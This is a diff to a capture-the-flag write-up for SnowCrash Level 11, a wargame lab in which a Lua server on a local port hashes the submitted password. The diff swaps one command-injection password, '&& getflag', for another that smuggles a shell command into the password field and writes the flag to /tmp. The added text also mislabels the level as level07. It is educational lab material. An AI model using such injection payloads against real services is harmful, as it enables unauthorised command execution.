@@ -1,9 +1,7 @@
 ## Level 11
+In this exercise, we have a lua script. This script is a sort of a server that will listen to a port and compare the content you give it with an expected hash.
 
-```bash
-level11@SnowCrash:~$ nc 127.0.0.1 5151
-Password: && getflag > /tmp/flag
-```
+As level07 user, you can use the getflag function to get the flag, but this time by adding it to the password Password: "; getflag > /tmp/flag" cat /tmp/flag
 
 ```bash
 level11@SnowCrash:~$ cat /tmp/flag
